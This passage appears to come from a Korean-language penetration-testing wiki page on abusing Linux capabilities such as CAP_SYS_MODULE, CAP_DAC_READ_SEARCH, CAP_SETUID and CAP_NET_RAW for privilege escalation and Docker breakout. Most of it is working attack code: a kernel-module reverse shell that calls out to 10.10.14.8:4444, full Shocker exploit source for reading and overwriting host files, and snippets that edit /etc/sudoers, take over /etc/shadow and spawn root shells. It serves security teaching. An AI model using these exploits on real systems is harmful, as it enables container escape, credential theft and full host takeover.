이는 **`insmod`** 명령을 사용하여 kernel module을 삽입할 수 있다는 의미입니다. 아래 예제에 따라 이 권한을 악용하여 **reverse shell**을 획득할 수 있습니다.

**환경 예제(Docker breakout)**

다음 명령을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **SYS_MODULE** capability가 활성화되어 있는 것을 확인할 수 있습니다.

Reverse shell을 실행할 **kernel module**과 이를 **compile**하기 위한 **Makefile**을 **Create**합니다:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile의 각 make 명령어 앞에 있는 공백 문자는 **스페이스가 아니라 반드시 탭이어야 합니다**!

`make`를 실행하여 컴파일합니다.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
마지막으로, 한 shell 안에서 nc를 시작하고 다른 shell에서 **load the module**하면 nc 프로세스에서 shell을 캡처할 수 있습니다:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**이 technique의 code는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)의 **"Abusing SYS_MODULE Capability" laboratory에서 복사되었습니다.**

이 technique의 또 다른 예시는 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)에서 확인할 수 있습니다.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 process가 **file을 읽고 directory를 읽고 실행할 때 permission을 우회**할 수 있도록 합니다. 주요 용도는 file searching 또는 reading입니다. 그러나 process가 `open_by_handle_at(2)` function을 사용할 수도 있게 하며, 이를 통해 process의 mount namespace 외부에 있는 file을 포함해 모든 file에 access할 수 있습니다. `open_by_handle_at(2)`에서 사용하는 handle은 `name_to_handle_at(2)`를 통해 얻는 non-transparent identifier여야 하지만, 변조에 취약한 inode number와 같은 민감한 information을 포함할 수 있습니다. 특히 Docker container context에서 이 capability를 exploit할 가능성은 Sebastian Krahmer가 shocker exploit을 통해 시연했으며, 이에 대한 분석은 [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 확인할 수 있습니다.
**이는 file read permission check와 directory read/execute permission check를** **우회할 수 있다는 의미입니다.**

**binary를 사용한 예시**

이 binary는 모든 file을 읽을 수 있습니다. 따라서 tar와 같은 file에 이 capability가 있으면 shadow file을 읽을 수 있습니다:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 예시**

이 경우 **`python`** 바이너리에 이 capability가 있다고 가정합니다. root 파일을 나열하려면 다음을 실행할 수 있습니다:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
그리고 파일을 읽기 위해 다음과 같이 할 수 있습니다:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

다음을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **DAC_READ_SEARCH** capability가 활성화되어 있는 것을 확인할 수 있습니다. 그 결과, 컨테이너는 **프로세스를 debug**할 수 있습니다.

다음 exploit이 어떻게 작동하는지는 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 확인할 수 있지만, 요약하면 **CAP_DAC_READ_SEARCH**는 permission check 없이 file system을 탐색할 수 있게 할 뿐만 아니라, _**open_by_handle_at(2)**_에 대한 모든 check를 명시적으로 제거하며, **다른 프로세스가 열어 둔 sensitive files에 우리 프로세스가 access할 수 있게 합니다**.

host에서 files를 읽기 위해 이 permission을 abuse하는 original exploit은 여기에서 확인할 수 있습니다: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). 다음은 **읽고 싶은 file을 첫 번째 argument로 지정하고 해당 내용을 file에 dump할 수 있도록 수정한 version입니다.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit은 host에 mount된 무언가를 가리키는 pointer를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit를 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. exploit이 작동하지 않는다면 다른 파일을 지정해야 할 수 있습니다. host에 mount된 파일을 찾으려면 다음 mount command를 실행합니다:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit은 host에 mount된 무언가를 가리키는 pointer를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit를 사용했으며, 이 수정된 버전은...](<../../images/image (407) (1).png>)

**이 technique의 code는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **의 "Abusing DAC_READ_SEARCH Capability" laboratory에서 복사되었습니다.**


## CAP_DAC_OVERRIDE

**이는 모든 file에 대한 write permission checks를 우회할 수 있으므로, 어떤 file이든 write할 수 있다는 의미입니다.**

**privileges를 escalate하기 위해 overwrite할 수 있는 file이 많이 있으며,** [**여기에서 아이디어를 얻을 수 있습니다**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**binary 예시**

이 예시에서는 vim에 이 capability가 있으므로 _passwd_, _sudoers_ 또는 _shadow_와 같은 file을 수정할 수 있습니다:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**binary 2 예시**

이 예시에서 **`python`** binary에는 이 capability가 부여됩니다. `python`을 사용해 모든 파일을 덮어쓸 수 있습니다:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**환경 + CAP_DAC_READ_SEARCH 예시 (Docker breakout)**

다음을 사용하여 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
먼저 호스트의 **임의 파일을 읽기 위해 DAC_READ_SEARCH capability를 악용하는** [이전 섹션](linux-capabilities.md#cap_dac_read_search)을 읽고 **exploit을 컴파일**하세요.\
그런 다음 호스트의 파일 시스템 내부에 **임의의 파일을 쓸 수 있도록 해주는 다음 버전의 Shocker exploit을 컴파일**하세요:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container에서 **탈출**하려면 호스트의 `/etc/shadow` 및 `/etc/passwd` 파일을 **download**하고, 여기에 **new user**를 **add**한 다음, **`shocker_write`**를 사용해 해당 파일을 덮어쓸 수 있습니다. 그런 다음 **ssh**를 통해 **access**합니다.

**이 technique의 코드는** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)의 "Abusing DAC_OVERRIDE Capability" laboratory에서 복사되었습니다.

## CAP_CHOWN

**이는 모든 파일의 ownership을 변경할 수 있다는 의미입니다.**

**binary를 사용한 예시**

**`python`** binary에 이 capability가 있다고 가정하면, **shadow** 파일의 **owner**를 **change**하고, **root password**를 **change**하여 privileges를 escalate할 수 있습니다:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
또는 이 capability를 가진 **`ruby`** binary를 사용하여:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**이는 모든 파일의 권한을 변경할 수 있다는 의미입니다.**

**binary를 사용한 예시**

python에 이 capability가 있으면 shadow 파일의 권한을 수정하고, **root password를 변경**하여 privilege를 escalate할 수 있습니다:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**생성된 프로세스의 effective user id를 설정할 수 있다는 의미입니다.**

**binary를 사용한 예시**

python에 이 **capability**가 있으면 이를 매우 쉽게 악용하여 root로 privileges를 escalate할 수 있습니다:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**또 다른 방법:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**생성된 프로세스의 유효 그룹 ID를 설정할 수 있다는 의미입니다.**

**권한을 상승시키기 위해 덮어쓸 수 있는** 파일이 많이 있습니다. [**여기에서 아이디어를 얻을 수 있습니다**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리를 사용한 예**

이 경우 모든 그룹을 사칭할 수 있으므로 그룹이 읽을 수 있는 흥미로운 파일을 찾아야 합니다:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
읽거나 쓰기를 통해 권한 상승에 악용할 수 있는 파일을 찾았다면 다음을 사용하여 **해당 그룹을 사칭하는 shell을 얻을 수 있습니다**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
이 경우 shadow 그룹을 impersonate했으므로 `/etc/shadow` 파일을 읽을 수 있습니다:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

두 capability를 동일한 helper에서 모두 사용할 수 있는 경우, 실용적인 chain은 다음과 같습니다.

1. EGID를 `shadow`(또는 다른 privileged group)로 전환합니다.
2. `/etc/shadow`에 `chown`을 사용해 group은 `shadow`로 유지하면서 자신의 UID를 설정합니다.
3. target hash를 읽고 crack/pivot합니다.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
이렇게 하면 직접적인 full root가 필요하지 않으며, credential reuse를 통해 pivot하는 데 흔히 충분합니다.

**docker**가 설치되어 있다면 **docker group**을 **impersonate**하고, 이를 악용해 [**docker socket**과 통신하여 privileges를 escalate](#writable-docker-socket)할 수 있습니다.

## CAP_SETFCAP

**이는 files와 processes에 capabilities를 설정할 수 있다는 의미입니다.**

**binary 예시**

python에 이 **capability**가 있다면, 이를 매우 쉽게 악용하여 privileges를 root로 escalate할 수 있습니다:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> CAP_SETFCAP을 사용하여 binary에 새로운 capability를 설정하면 이 cap을 잃게 됩니다.

[SETUID capability](linux-capabilities.md#cap_setuid)를 획득하면 해당 섹션으로 이동하여 privileges를 escalate하는 방법을 확인할 수 있습니다.

**Example with environment (Docker breakout)**

기본적으로 **CAP_SETFCAP은 Docker의 container 내부 proccess에 부여됩니다**. 다음과 같이 실행하여 이를 확인할 수 있습니다:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
이 capability를 사용하면 **바이너리에 다른 capability를 부여할 수 있으므로**, 이 페이지에서 언급한 **다른 capability breakout을 악용하여** 컨테이너에서 **escaping**할 수 있다고 생각할 수 있습니다.\
하지만 gdb 바이너리에 CAP_SYS_ADMIN 및 CAP_SYS_PTRACE capability를 부여하려고 하면, capability를 부여할 수는 있지만 **그 후에는 바이너리를 실행할 수 없다는 것**을 알게 됩니다:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 스레드가 사용할 수 있는 **effective capabilities**에 대한 제한적 상위 집합입니다. 또한 **CAP_SETPCAP** capability가 effective set에 없는 스레드가 inheritable set에 추가할 수 있는 capabilities에 대한 제한적 상위 집합이기도 합니다._\
Permitted capabilities가 사용할 수 있는 capabilities를 제한하는 것처럼 보입니다.\
하지만 Docker는 기본적으로 **CAP_SETPCAP**도 부여하므로, **inheritable set에 새로운 capabilities를 설정할 수 있을 가능성이 있습니다**.\
그러나 이 capability의 문서에는 다음과 같이 설명되어 있습니다: _CAP_SETPCAP : \[…] **호출 스레드의 bounding set에 있는 모든 capability를 해당 스레드의 inheritable set에 추가**할 수 있습니다._\
이는 bounding set에 있는 capabilities만 inheritable set에 추가할 수 있다는 의미로 보입니다. 따라서 **권한 상승을 위해 CAP_SYS_ADMIN 또는 CAP_SYS_PTRACE 같은 새로운 capabilities를 inheritable set에 넣을 수는 없습니다**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` system call 접근, 다양한 disk command 실행 등 여러 민감한 작업을 제공합니다. 이 capability를 통해 `FIBMAP ioctl(2)`도 활성화되며, 이로 인해 [과거에](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) 문제가 발생한 적이 있습니다. man page에 따르면, 이 capability의 보유자는 `other devices`에서 **다양한 device-specific operation을 수행**할 수도 있습니다.

이는 **privilege escalation** 및 **Docker breakout**에 유용할 수 있습니다.

## CAP_KILL

**이는 모든 process를 kill할 수 있다는 의미입니다.**

**binary를 사용한 예시**

**`python`** binary에 이 capability가 있다고 가정해 보겠습니다. **일부 service 또는 socket configuration**(또는 service와 관련된 configuration file)을 **수정할 수 있다면**, 해당 파일에 backdoor를 삽입한 다음 service와 관련된 process를 kill하고, 새로운 configuration file이 backdoor와 함께 실행될 때까지 기다릴 수 있습니다.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

**kill capabilities**가 있고 **root**(또는 다른 사용자)로 실행 중인 **node program**이 있다면, 해당 프로그램에 **signal SIGUSR1**을 **send**하여 **node debugger**를 열게 만들고 연결할 수 있을 것입니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**이는 모든 port(권한이 필요한 port 포함)에서 listen할 수 있다는 의미입니다.** 이 capability만으로 직접 privilege escalation을 수행할 수는 없습니다.

**binary 예시**

**`python`**에 이 capability가 있으면 모든 port에서 listen할 수 있으며, 해당 port에서 다른 모든 port로 연결할 수도 있습니다(일부 서비스는 특정 권한이 필요한 port에서의 연결을 요구합니다).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability는 process가 **RAW 및 PACKET sockets를 생성**할 수 있도록 하여 임의의 network packets를 생성하고 전송할 수 있게 합니다. 이는 containerized environments에서 packet spoofing, traffic injection, network access controls 우회와 같은 security risks로 이어질 수 있습니다. 악의적인 actors는 이를 악용하여 container routing을 방해하거나 host network security를 침해할 수 있으며, 특히 적절한 firewall protections가 없는 경우 더욱 위험합니다. 또한 **CAP_NET_RAW**는 RAW ICMP requests를 통한 ping과 같은 작업을 privileged containers에서 지원하는 데 중요합니다.

**이는 traffic을 sniff할 수 있다는 의미입니다.** 이 capability만으로는 직접 privileges를 escalate할 수 없습니다.

**binary 예시**

binary **`tcpdump`**에 이 capability가 있으면 이를 사용하여 network information을 capture할 수 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**환경**에서 이 capability를 제공한다면 트래픽을 sniff하기 위해 **`tcpdump`**도 사용할 수 있습니다.

**바이너리 2를 사용한 예시**

다음 예시는 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용한 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)의 "_The Basics: CAP-NET_BIND + NET_RAW_" lab에서 가져왔습니다.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability는 노출된 network namespace 내에서 firewall 설정, routing table, socket permission, network interface 설정을 포함한 **network configuration을 변경**할 수 있는 권한을 보유자에게 부여합니다. 또한 network interface에서 **promiscuous mode**를 활성화할 수 있어 namespace 전반의 packet sniffing이 가능합니다.

**Example with binary**

**python binary**가 이러한 capabilities를 가지고 있다고 가정해 보겠습니다.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**inode 속성을 수정할 수 있다는 의미입니다.** 이 capability로 직접 privilege escalation을 수행할 수는 없습니다.

**binary를 사용한 예시**

